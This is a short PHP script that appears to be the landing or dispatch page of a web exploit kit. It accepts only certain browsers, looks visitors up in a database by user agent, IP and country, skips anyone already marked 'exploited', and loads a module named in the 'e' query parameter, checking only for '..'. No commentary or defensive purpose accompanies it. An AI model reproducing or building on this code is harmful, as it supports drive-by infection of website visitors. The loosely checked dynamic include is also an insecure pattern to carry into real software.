<?


include_once('config.php');

include("include/browser.php");

$browser = new Browser();
$data = $browser->identification();

if(($data['browser'] != "FIREFOX" && $data['browser'] != "CHROME" && $data['browser'] != "SAFARI" && $data['browser'] != "OPERA" && $data['browser'] != "MSIE") || $data['platform'] == "OTHER"){
	exit();
}

include_once('include/sql.php');
include_once('include/visitors.php');
$sql = new CSQL($sqlSettings);
$sql->open();
	
$cvisitors = new CVisitors($sql, $sqlSettings);
$exploited = $cvisitors->checkVisitor($_SERVER['HTTP_USER_AGENT'], $cvisitors->getIpAddr(), $cvisitors->getIpAddrCountry($cvisitors->getIpAddr()));
$sql->close();

if($exploited){
	exit();
}


$page = $_GET["e"];

$pos = strpos($page, "..");


if($page != "" && isset($page) && $pos === false ){
	$inc = "modules/" . $page . ".php";
	
	if(file_exists($inc)){
		
		require_once($inc);
	
	}else{
		
		require_once("modules/index.php");

	}

}else{
	
	require_once("modules/index.php");

}



?>
